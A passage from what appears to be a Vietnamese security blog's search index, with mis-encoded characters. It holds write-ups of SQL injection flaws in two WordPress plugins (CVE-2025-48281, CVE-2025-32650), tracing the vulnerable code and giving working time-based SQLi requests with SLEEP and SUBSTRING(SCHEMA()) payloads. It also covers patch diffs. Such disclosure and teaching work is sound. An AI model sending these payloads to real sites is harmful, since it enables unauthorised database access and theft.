get_designs trong th∆∞ m·ª•c ch·ª©a plugin.\nüëâ get_designs ƒë∆∞·ª£c g·ªçi trong get_items, init_index_request v√† c√°c h√†m test kh√¥ng ƒë√°ng quan t√¢m\nV√¨ ƒë√¢y l√† l·ªói h·ªïng unauthenticated n√™n c·∫ßn ki·ªÉm tra ch√≠nh x√°c h√†m n√†o kh√¥ng c·∫ßn x√°c th·ª±c ng∆∞·ªùi d√πng.\nget_items() Function get_items n·∫±m trong class MyStyle_Wp_Rest_Api_Design_Controller thu·ªôc file includes/wprestapi/class-mystyle-wp-rest-api-design-controller.php\nƒêo·∫°n code tr∆∞·ªõc khi g·ªçi h√†m get_designs kh√¥ng c√≥ g√¨ li√™n quan ƒë·∫øn x√°c th·ª±c ng∆∞·ªùi d√πng n√™n kh√¥ng c·∫ßn quan t√¢m ph·∫ßn ph√≠a sau. get_items ƒë∆∞·ª£c h√†m register_routes trong c√πng class s·ª≠ d·ª•ng l√†m callback c·ªßa REST API th√¥ng qua h√†m register_rest_route() trong WordPress.\npublic function register_routes() { $version = \u0026#39;2\u0026#39;; $vendor = \u0026#39;wc-mystyle\u0026#39;; $namespace = $vendor . \u0026#39;/v\u0026#39; . $version; $base = \u0026#39;designs\u0026#39;; register_rest_route( $namespace, \u0026#39;/\u0026#39; . $base, array( array( \u0026#39;methods\u0026#39; =\u0026gt; WP_REST_Server::READABLE, // GET \u0026#39;callback\u0026#39; =\u0026gt; array( $this, \u0026#39;get_items\u0026#39; ), \u0026#39;permission_callback\u0026#39; =\u0026gt; array( $this, \u0026#39;get_items_permissions_check\u0026#39; ), \u0026#39;args\u0026#39; =\u0026gt; array(), ) ) ) // other logic } {: file=\u0026ldquo;includes/wprestapi/class-mystyle-wp-rest-api-design-controller.php v3.21.1\u0026rdquo; }\nTuy nhi√™n tr∆∞·ªõc khi callback ƒë∆∞·ª£c g·ªçi, c·∫ßn ph·∫£i check permissions b·∫±ng h√†m get_items_permissions_check, ta c·∫ßn ph·∫£i bi·∫øt anonymoust user c√≥ ƒë∆∞·ª£c g·ªçi api n√†y kh√¥ng. T√¨m ki·∫øm v·ªõi t·ª´ kh√≥a get_items_permissions_check.\nüëâ get_items_permissions_check g·ªçi ƒë·∫øn wc_rest_check_manager_permissions ƒë·ªÉ ki·ªÉm tra quy·ªÅn v·ªõi $object = 'settings'. ƒê·ªÉ hi·ªÉu h√†m n√†y ƒë∆∞·ª£c s·ª≠ d·ª•ng nh∆∞ th·∫ø n√†o, ta c·∫ßn t√¨m ki·∫øm theo t·ª´ kh√≥a wc_rest_check_manager_permissions trong to√†n b·ªô th∆∞ m·ª•c plugin, b·ªüi v√¨ h√†m n√†y kh√¥ng ƒë∆∞·ª£c ƒë·ªãnh nghƒ©a tr·ª±c ti·∫øp trong plugin hi·ªán t·∫°i.\nwc_rest_check_manager_permissions ƒë∆∞·ª£c ƒë·ªãnh nghƒ©a trong plugin WooCommerce settings mapping th√†nh manage_woocommerce G·ªçi current_user_can( 'manage_woocommerce' ) ƒë·ªÉ ki·ªÉm tra quy·ªÅn c·ªßa user =\u0026gt; Ch·ªâ Admin (ho·∫∑c user c√≥ quy·ªÅn manage_woocommerce). üëâ V√¨ v·∫≠y ta kh√¥ng th·ªÉ khai th√°c t·ª´ h√†m get_items =\u0026gt; khai th√°c h√†m t·ª´ h√†m init_index_request\ninit_index_request() Function init_index_request n·∫±m trong class MyStyle_Design_Profile_Page thu·ªôc file includes/pages/class-mystyle-design-profile-page.php\nƒêo·∫°n code tr∆∞·ªõc khi g·ªçi h√†m get_designs kh√¥ng c√≥ g√¨ li√™n quan ƒë·∫øn x√°c th·ª±c ng∆∞·ªùi d√πng n√™n kh√¥ng c·∫ßn quan t√¢m ph·∫ßn ph√≠a sau. init_index_request ƒë∆∞·ª£c h√†m init trong c√πng class g·ªçi.\npublic function init() { // Check if the current page is /designs if ( ! self::is_current_post() ) { return; } // other logic $design_id = self::get_design_id_from_url(); // Ch·ªâ ho·∫°t ƒë·ªông khi c√°c bi·∫øn trong POST request sau ƒë∆∞·ª£c truy·ªÅn =\u0026gt; kh√¥ng quan t√¢m if( isset( $_POST[\u0026#39;delete_design_nonce\u0026#39;] ) \u0026amp;\u0026amp; wp_verify_nonce( sanitize_key( $_POST[\u0026#39;delete_design_nonce\u0026#39;] ), \u0026#39;mystyle_delete_design_nonce\u0026#39; ) ) { $design = MyStyle_DesignManager::get( $design_id, $user, $session ) ; if ( $design ) { // Check if the user is the owner of the design or an admin. if ( current_user_can( \u0026#39;administrator\u0026#39; ) || MyStyle_DesignManager::is_user_design_owner( $this-\u0026gt;user-\u0026gt;ID, $design_id ) ) { // restrict the design access to 2 (deleted). $design-\u0026gt;set_access( 2 ); MyStyle_DesignManager::persist( $design ); $this-\u0026gt;delete_design_success_message = \u0026#39;Design has been successfully deleted.\u0026#39;; } } } if ( false === $design_id || preg_match( \u0026#39;/page/\u0026#39;, $design_id ) ) { $design_profile_page-\u0026gt;init_index_request(); } else { $design_profile_page-\u0026gt;init_design_request( $design_id ); } } {: file=\u0026ldquo;includes/pages/class-mystyle-design-profile-page.php v3.21.1\u0026rdquo; }\nƒê·ªÉ init_index_request ƒë∆∞·ª£c g·ªçi th√¨ c√¢u ƒëi·ªÅu ki·ªán if ph·∫£i x·∫£y ra, ta c·∫ßn ph·∫£i bi·∫øt $design_id l√† g√¨, t√¨m ki·∫øm h√†m get_design_id_from_url trong c√πng class, v√¨ n√≥ ƒë∆∞·ª£c g·ªçi b·∫±ng self v√† g√°n gi√° tr·ªã cho $design_id\npublic static function get_design_id_from_url() { // Try the query vars ( ex: \u0026amp;design_id=10 ). $design_id = get_query_var( \u0026#39;design_id\u0026#39; ); if ( preg_match( \u0026#39;/page/\u0026#39;, $design_id ) ) { $design_id = false; } elseif ( empty( $design_id ) ) { // ---------- try at /designs/10. -------- // phpcs:ignore $path = $_SERVER[\u0026#39;REQUEST_URI\u0026#39;]; // Get the design profile page\u0026#39;s WP_Post slug. /* @var $post \\WP_Post phpcs:ignore */ $post = get_post( self::get_id() ); $slug = $post-\u0026gt;post_name; $pattern = \u0026#39;/^.*\\/\u0026#39; . $slug . \u0026#39;\\/([\\d]+)/\u0026#39;; if ( preg_match( $pattern, $path, $matches ) ) { $design_id = $matches[1]; } else { $design_id = false; } // ------------------------------------- } return $design_id; } {: file=\u0026ldquo;includes/pages/class-mystyle-design-profile-page.php v3.21.1\u0026rdquo; }\nüëâ H√†m n√†y l·∫•y design_id t·ª´ url n√™n khi kh√¥ng th√™m n√≥ v√†o url khi g·ª≠i request =\u0026gt; if x·∫£y ra =\u0026gt; init_index_request ƒë∆∞·ª£c g·ªçi.\nQuay tr·ªü l·∫°i h√†m init, n√≥ ƒë∆∞·ª£c g·ªçi trong __construct c·ªßa c√πng class.\npublic function __construct() { // other logic add_action( \u0026#39;init\u0026#39;, array( \u0026amp;$this, \u0026#39;rewrite_rules\u0026#39; ) ); add_action( \u0026#39;template_redirect\u0026#39;, array( \u0026amp;$this, \u0026#39;init\u0026#39; ) ); } {: file=\u0026ldquo;includes/pages/class-mystyle-design-profile-page.php v3.21.1\u0026rdquo; }\ninit l√† callback g·∫Øn v√†o hook template_redirect: l√† m·ªôt action hook trong WordPress, ch·∫°y tr∆∞·ªõc khi n·ªôi dung template th·ª±c s·ª± ƒë∆∞·ª£c load v√† hi·ªÉn th·ªã ra tr√¨nh duy·ªát.\nPh√≠a tr√™n hook template_redirect trong __construct c√≤n c√≥ hook init, n√≥ s·∫Ω ch·∫°y tr√™n m·ªói request v·ªõi callback rewrite_rules:\npublic function rewrite_rules() { // Flush rewrite rules for newly created rewrites. flush_rewrite_rules(); add_rewrite_rule( \u0026#39;designs/([a-zA-Z0-9_-].+)?$\u0026#39;, // designs/{slug} \u0026#39;index.php?pagename=designs\u0026amp;design_id=$matches[1]\u0026#39;, \u0026#39;top\u0026#39; ); } H√†m n√†y th√™m route /designs/{id} ƒë·ªÉ load trang designs v√† truy·ªÅn bi·∫øn design_id.\nüëâ Nh∆∞ v·∫≠y khi truy c·∫≠p v√†o /designs/:\nCallback rewrite_rules ƒë∆∞·ª£c g·ªçi, WordPress s·∫Ω load /index.php?pagename=designs\u0026amp;design_id=. design_id kh√¥ng c√≥ gi√° tr·ªã n√™n get_design_id_from_url ƒë∆∞·ª£c g√°n cho $design_id s·∫Ω l√† false =\u0026gt; ƒëi·ªÅu ki·ªán false === $design_id x·∫£y ra khi·∫øn init_index_request trong kh·ªëi if ƒë∆∞·ª£c g·ªçi. init_index_request g·ªçi ƒë·∫øn get_designs get_designs l·∫•y tr·ª±c ti·∫øp orderby t·ª´ GET request th√™m v√†o c√¢u query ƒë·ªÉ th·ª±c thi Exploit Detect SQLi G·ª≠i GET request ch·ª©a payload SQLi.\nGET /designs/?orderby=(SELECT+SLEEP(5)) HTTP/1.1 Host: localhost ... Cookie: cookie_here Khi ƒë√≥ c√¢u query s·∫Ω tr·ªü th√†nh:\nSELECT * FROM wp_mystyle_designs WHERE ms_access = 0 ORDER BY (SELECT SLEEP(5)) ASC LIMIT 25 OFFSET 0 üëâ D·ª±a tr√™n th·ªùi gian ph·∫£n h·ªìi =\u0026gt; payload ho·∫°t ƒë·ªông.\nTrong tr∆∞·ªùng h·ª£p n√†y kh√¥ng n√™n comment ph√≠a sau SLEEP. V√¨ developer ƒë√£ enter khi·∫øn OFFSET xu·ªëng d√≤ng th·ª© 2, khi comment ho·∫°t ƒë·ªông, parser c·ªßa SQL s·∫Ω x·ª≠ l√Ω v√† tr·∫£ v·ªÅ l·ªói. {: .prompt-info }\nCu·ªói c√πng s·∫Ω ƒë∆∞·ª£c t√°ch th√†nh 2 c√¢u query ·ªü 2 d√≤ng kh√°c nhau g√¢y ra l·ªói:\nSELECT * FROM wp_mystyle_designs WHERE ms_access = 0 ORDER BY (SELECT SLEEP(5)) -- ASC LIMIT 25\tOFFSET 0 Get First Letter of Database Name ƒêi·ªÅu ki·ªán ti√™n quy·∫øt ƒë·ªÉ dump ƒë∆∞·ª£c h·∫øt data l√† ph·∫£i dump ƒë∆∞·ª£c 1 k√Ω t·ª± b·∫•t k·ª≥ c·ªßa t√™n database, n·∫øu l·∫•y ƒë∆∞·ª£c th√¨ g·∫ßn nh∆∞ to√†n b·ªô data ƒë·ªÅu dump ƒë∆∞·ª£c.\nG·ª≠i request v·ªõi SQLi payload:\nGET /designs/?orderby=IF(SUBSTRING(SCHEMA(),1,1)=0x77,SLEEP(5),1) HTTP/1.1 Host: localhost ... Cookie: cookie_here S·ª≠ d·ª•ng SUBSTRING() ƒë·ªÉ l·∫•y k√Ω t·ª± ƒë·∫ßu ti√™n c·ªßa database name, IF() tr·∫£ v·ªÅ SLEEP(5) n·∫øu k√Ω t·ª± ƒë√≥ l√† 0x77(\u0026lsquo;w\u0026rsquo;)\nS·ª≠ d·ª•ng hex encoding w th√†nh 0x77 v√¨ orderby ƒë∆∞·ª£c l·∫•y t·ª´ GET request trong n√™n b·ªã escape b·ªüi magic quotes trong WordPress\nüëâ D·ª±a tr√™n th·ªùi gian ph·∫£n h·ªìi =\u0026gt; k√≠ t·ª± ƒë·∫ßu ti√™n ƒë√∫ng l√† w.\nAutomatic Extraction D·ª±a tr√™n kƒ© thu·∫≠t Timebased SQLi ta vi·∫øt script ƒë·ªÉ t·ª± ƒë·ªông khai th√°c.\nScript Here\nConclusion L·ªó h·ªïng CVE-2025-48281 trong plugin WordPress MyStyle Custom Product Designer tr∆∞·ªõc phi√™n b·∫£n 3.21.2 xu·∫•t ph√°t t·ª´ vi·ªác truy·ªÅn tr·ª±c ti·∫øp input t·ª´ ng∆∞·ªùi d√πng v√†o SQL query m√† kh√¥ng c√≥ bi·ªán ph√°p ki·ªÉm so√°t ch·∫∑t ch·∫Ω d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\nB·∫£n v√° ch√≠nh th·ª©c ƒë√£ tri·ªÉn khai white list, gi√∫p ƒë·∫£m b·∫£o d·ªØ li·ªáu ƒë·∫ßu v√†o ƒë∆∞·ª£c ki·ªÉm so√°t v√† an to√†n h∆°n.\nKey takeaways:\nKi·ªÉm so√°t k·ªπ input t·ª´ ng∆∞·ªùi d√πng. Lu√¥n s·ª≠ d·ª•ng $wpdb-\u0026gt;prepare() khi l√†m vi·ªác v·ªõi database trong WordPress ƒë·ªÉ tr√°nh SQL Injection. Th∆∞·ªùng xuy√™n c·∫≠p nh·∫≠t plugin v√† ki·ªÉm tra b·∫£o m·∫≠t ƒë·ªÉ tr√°nh tr·ªü th√†nh m·ª•c ti√™u t·∫•n c√¥ng. References SQL Injection cheat sheet - PortSwigger\nWordPress MyStyle Custom Product Designer Plugin \u0026lt;= 3.21.1 is vulnerable to SQL Injection\n","permalink":"//localhost:1313/vi/posts/2025-09-09-cve-2025-48281/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eL·ªó h·ªïng x·∫£y ra tr√™n plugin \u003cstrong\u003eMyStyle Custom Product Designer\u003c/strong\u003e c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n \u003cstrong\u003e3.21.2\u003c/strong\u003e. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-48281\"\u003eCVE-2025-48281\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/mystyle-custom-product-designer\"\u003eWordPress MyStyle Custom Product Designer Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 3.21.1\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e:  High (9.3)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Unauthenticated\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eMyStyle Custom Product Designer\u003c/strong\u003e:  v3.21.1(vul) v√† v3.21.2(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eActived WooCommerce plugin\u003c/strong\u003e: plugin b·∫Øt bu·ªôc \u003cstrong\u003eactived\u003c/strong\u003e tr∆∞·ªõc khi c√†i \u003cstrong\u003eMyStyle Custom Product Designer Plugin\u003c/strong\u003e, m·ªôt s·ªë h√†m trong \u003cstrong\u003eWooCommerce\u003c/strong\u003e s·∫Ω ƒë∆∞·ª£c s·ª≠ d·ª•ng.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eNguy√™n nh√¢n c·ªë l√µi do ·ª©ng d·ª•ng ch√®n tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ \u003cstrong\u003eGET\u003c/strong\u003e request v√†o SQL query m√† kh√¥ng c√≥ c∆° ch·∫ø ki·ªÉm so√°t ch·∫∑t ch·∫Ω.\u003c/p\u003e","title":"CVE-2025-48281"},{"content":"Introduction L·ªó h·ªïng x·∫£y ra tr√™n plugin Accessibility Suite c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n 4.19. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\nCVE ID: CVE-2025-32650 Product: WordPress Accessibility Suite Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 4.18 CVSS severity: High (8.5) Required Privilege: Subscriber Requirements Local WordPress and Debugging Accessibility Suite: v4.18(vul) v√† v4.19(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Analysis ·ª®ng d·ª•ng ch∆∞a th·ª±c hi·ªán √©p ki·ªÉu cho input v√† m·∫∑c d√π c√≥ s·ª≠ d·ª•ng prepare() ƒë·ªÉ ch·ªëng SQLi, nh∆∞ng do tri·ªÉn khai kh√¥ng ƒë√∫ng n√™n l·ªó h·ªïng SQLi v·∫´n t·ªìn t·∫°i.\nPatch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file includes/classes/Helper.php\nstatic function save_false_positive($scan_id, $issue_id){ // other logic if(! is_admin()) { return \u0026#39;\u0026#39;; } // other logic $list = json_decode( $wpdb-\u0026gt;get_results($wpdb-\u0026gt;prepare(\u0026#34;SELECT list FROM $table_name WHERE scan_id = $scan_id\u0026#34;))[0]-\u0026gt;list // phpcs:ignore ); } {: file=\u0026ldquo;includes/classes/Helper.php v4.18\u0026rdquo; }\nB·∫£n v√° ƒë√£ truy·ªÅn $scan_id nh∆∞ tham s·ªë v√†o c√¢u query. SQL injection ƒë∆∞·ª£c ph√≤ng ng·ª´a v√¨ bi·∫øn kh√¥ng ƒë∆∞·ª£c n·ªëi tr·ª±c ti·∫øp v√†o query n·ªØa.\nstatic function save_false_positive($scan_id, $issue_id){ // other logic if(! is_admin()) { return \u0026#39;\u0026#39;; } // other logic $scan_id = absint($scan_id); // Ensure scan_id is a positive integer if (!$scan_id) { return [\u0026#34;status\u0026#34; =\u0026gt; \u0026#34;failed\u0026#34;, \u0026#34;msg\u0026#34; =\u0026gt; \u0026#34;Invalid scan ID\u0026#34;]; } // Get list using properly prepared query $query = $wpdb-\u0026gt;prepare( \u0026#34;SELECT list FROM %i WHERE scan_id = %d\u0026#34;, $table_name, $scan_id ); $result = $wpdb-\u0026gt;get_results($query); } {: file=\u0026ldquo;includes/classes/Helper.php v4.19\u0026rdquo; }\nHow it work? L·ªó h·ªïng n·∫±m trong h√†m tƒ©nh save_false_positive c·ªßa class Helper thu·ªôc file includes/classes/Helper.php. ƒê·ªÉ x√°c ƒë·ªãnh n∆°i n√≥ ƒë∆∞·ª£c g·ªçi, ta t√¨m ki·∫øm v·ªõi t·ª± kh√≥a save_false_positive trong th∆∞ m·ª•c ch·ª©a plugin.\nüëâ save_false_positive ƒë∆∞·ª£c callback c·ªßa action hook wp_ajax_ONLINE_ADAv4/save_false_positive g·ªçi.\nKhi POST request ƒë∆∞·ª£c g·ª≠i ƒë·∫øn /wp-admin/admin-ajax.php v·ªõi action=ONLINE_ADAv4/save_false_positive callback ƒë∆∞·ª£c g·ªçi. Trong request c·∫ßn 2 POST param issue_id v√† scan_id. N·∫øu kh√¥ng, ·ª©ng d·ª•ng s·∫Ω tr·∫£ v·ªÅ:\n{\u0026#34;status\u0026#34;:\u0026#34;failed\u0026#34;,\u0026#34;msg\u0026#34;:\u0026#34;Did not receive the scan ID or the issue ID\u0026#34;} save_false_positive ƒë∆∞·ª£c g·ªçi v·ªõi ƒë·ªëi s·ªë issue_id v√† scan_id. C√°c ƒë·ªëi s·ªë n√†y s·∫Ω b·ªã escape b·ªüi magic quotes trong WordPress v√¨ l·∫•y tr·ª±c ti·∫øp t·ª´ POST request.\n·ª®ng d·ª•ng check xem ng∆∞·ªùi d√πng c√≥ quy·ªÅn truy c·∫≠p v√†o trang admin kh√¥ng. N·∫øu kh√¥ng, tr·∫£ v·ªÅ chu·ªói r·ªóng.\nif(! is_admin()) { return \u0026#39;\u0026#39;; } Sau ƒë√≥ c√°c ƒë·ªëi s·ªë tr·ª±c ti·∫øp truy·ªÅn v√†o c√¢u query ch·ª©a l·ªó h·ªïng SQLi r·ªìi th·ª±c thi.\nExploit Detect SQLi G·ª≠i POST request ch·ª©a payload SQLi. V√¨ ch·ªâ c·∫ßn l√† user c√≥ quy·ªÅn truy c·∫≠p v√†o trang admin, n√™n ta t·∫°o user v·ªõi role:subcriber c√≥ privilege th·∫•p nh·∫•t.\nTrong WordPress, user c√≥ role cao h∆°n s·∫Ω k·∫ø th·ª´a c·∫£ privilege role th·∫•p h∆°n. N√™n ch·ªâ c·∫ßn user subcriber g·ª≠i payload th√†nh c√¥ng th√¨ t·∫•t c·∫£ user c√≤n l·∫°i ƒë·ªÅu c√≥ th·ªÉ. ƒê√∫ng v·ªõi m√¥ t·∫£ c·ªßa CVE\nPOST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost Content-Type: application/x-www-form-urlencoded; charset=UTF-8 ... Cookie: cookie_here action=ONLINE_ADAv4/save_false_positive\u0026amp;issue_id=1\u0026amp;scan_id=1 UNION SELECT SLEEP(5) Khi ƒë√≥ c√¢u query s·∫Ω tr·ªü th√†nh\nSELECT list FROM wp_oada_false_positives WHERE scan_id = 1 UNION SELECT SLEEP(5) üëâ D·ª±a tr√™n th·ªùi gian ph·∫£n h·ªìi =\u0026gt; payload ho·∫°t ƒë·ªông.\nC√°c technique c√≥ th·ªÉ s·ª≠ d·ª•ng trong tr∆∞·ªùng h·ª£p table r·ªóng:\nUNION: v√¨ n√≥ kh√¥ng ph·ª• thu·ªôc v√†o d·ªØ li·ªáu b·∫£ng c·ªßa c√¢u query tr∆∞·ªõc ƒë√≥, nh∆∞ng c·∫ßn ph·∫£i t√¨m ƒë∆∞·ª£c s·ªë c·ªôt t∆∞∆°ng ·ª©ng v·ªõi truy v·∫•n tr∆∞·ªõc ƒë√≥. Subquery: Subquery trong m·ªánh ƒë·ªÅ WHERE: MySQL c√≥ th·ªÉ t·ªëi ∆∞u h√≥a v√† b·ªè qua subquery n·∫øu k·∫øt qu·∫£ c√≥ th·ªÉ x√°c ƒë·ªãnh s·ªõm. N·∫øu b·∫£ng kh√¥ng c√≥ d·ªØ li·ªáu, k·∫øt qu·∫£ cu·ªëi c√πng s·∫Ω l√† t·∫≠p r·ªóng, MySQL kh√¥ng c·∫ßn th·ª±c thi SLEEP(). Subquery trong m·ªánh ƒë·ªÅ FROM: Truy v·∫•n con ƒë∆∞·ª£c coi l√† b·∫£ng t·∫°m th·ªùi. MySQL ph·∫£i th·ª±c thi truy v·∫•n con n√†y ƒë·∫ßu ti√™n ƒë·ªÉ t·∫°o b·∫£ng t·∫°m th·ªùi, sau ƒë√≥ m·ªõi th·ª±c thi truy v·∫•n ch√≠nh. Get First Letter of Database Name ƒêi·ªÅu ki·ªán ti√™n quy·∫øt ƒë·ªÉ dump ƒë∆∞·ª£c h·∫øt data l√† ph·∫£i dump ƒë∆∞·ª£c 1 k√Ω t·ª± b·∫•t k·ª≥ c·ªßa t√™n database, n·∫øu l·∫•y ƒë∆∞·ª£c th√¨ g·∫ßn nh∆∞ to√†n b·ªô data ƒë·ªÅu dump ƒë∆∞·ª£c.\nG·ª≠i request v·ªõi SQLi payload:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost Content-Type: application/x-www-form-urlencoded; charset=UTF-8 ... Cookie: cookie_here action=ONLINE_ADAv4/save_false_positive\u0026amp;issue_id=1\u0026amp;scan_id=1 UNION SELECT IF(SUBSTRING(SCHEMA(),1,1)=0x77, SLEEP(5), 1) S·ª≠ d·ª•ng SUBSTRING() ƒë·ªÉ l·∫•y k√Ω t·ª± ƒë·∫ßu ti√™n c·ªßa database name, IF() tr·∫£ v·ªÅ SLEEP(5) n·∫øu k√Ω t·ª± ƒë√≥ l√† 0x77(\u0026lsquo;w\u0026rsquo;)\nS·ª≠ d·ª•ng hex encoding w th√†nh 0x77 v√¨ nh∆∞ ph√¢n t√≠ch ·ªü tr√™n, scan_id s·∫Ω b·ªã escape.\nüëâ D·ª±a tr√™n th·ªùi gian ph·∫£n h·ªìi =\u0026gt; k√≠ t·ª± ƒë·∫ßu ti√™n ƒë√∫ng l√† w.\nAutomatic Extraction D·ª±a tr√™n kƒ© thu·∫≠t Timebased SQLi ta vi·∫øt script ƒë·ªÉ t·ª± ƒë·ªông khai th√°c.\nScript Here\nConclusion L·ªó h·ªïng CVE-2025-32650 trong plugin WordPress Accessibility Suite tr∆∞·ªõc phi√™n b·∫£n 4.19 xu·∫•t ph√°t t·ª´ vi·ªác tri·ªÉn khai kh√¥ng ƒë√∫ng h√†m $wpdb-\u0026gt;prepare() d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\nB·∫£n v√° ch√≠nh th·ª©c ƒë√£ tri·ªÉn khai ƒë√∫ng $wpdb-\u0026gt;prepare, gi√∫p ƒë·∫£m b·∫£o d·ªØ li·ªáu ƒë·∫ßu v√†o ƒë∆∞·ª£c ki·ªÉm so√°t v√† an to√†n h∆°n.\nKey takeaways:\nLu√¥n s·ª≠ d·ª•ng $wpdb-\u0026gt;prepare() khi l√†m vi·ªác v·ªõi database trong WordPress ƒë·ªÉ tr√°nh SQL Injection. Th∆∞·ªùng xuy√™n c·∫≠p nh·∫≠t plugin v√† ki·ªÉm tra b·∫£o m·∫≠t ƒë·ªÉ tr√°nh tr·ªü th√†nh m·ª•c ti√™u t·∫•n c√¥ng. References SQL Injection cheat sheet - PortSwigger\nWordPress Accessibility Suite Plugin \u0026lt;= 4.18 is vulnerable to SQL Injection ","permalink":"//localhost:1313/vi/posts/2025-09-09-cve-2025-32650/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eL·ªó h·ªïng x·∫£y ra tr√™n plugin \u003cstrong\u003eAccessibility Suite\u003c/strong\u003e c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n \u003cstrong\u003e4.19\u003c/strong\u003e. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-32650\"\u003eCVE-2025-32650\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/online-accessibility/\"\u003eWordPress Accessibility Suite Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 4.18\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: High (8.5)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Subscriber\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAccessibility Suite\u003c/strong\u003e:  v4.18(vul) v√† v4.19(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003e·ª®ng d·ª•ng ch∆∞a th·ª±c hi·ªán √©p ki·ªÉu cho \u003cstrong\u003einput\u003c/strong\u003e v√† m·∫∑c d√π c√≥ s·ª≠ d·ª•ng \u003ccode\u003eprepare()\u003c/code\u003e ƒë·ªÉ ch·ªëng SQLi, nh∆∞ng do tri·ªÉn khai kh√¥ng ƒë√∫ng n√™n l·ªó h·ªïng SQLi v·∫´n t·ªìn t·∫°i.\u003c/p\u003e","title":"CVE-2025-32650"},{"content":"Introduction L·ªó h·ªïng x·∫£y ra tr√™n plugin Mail Mint c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n 1.18.6. 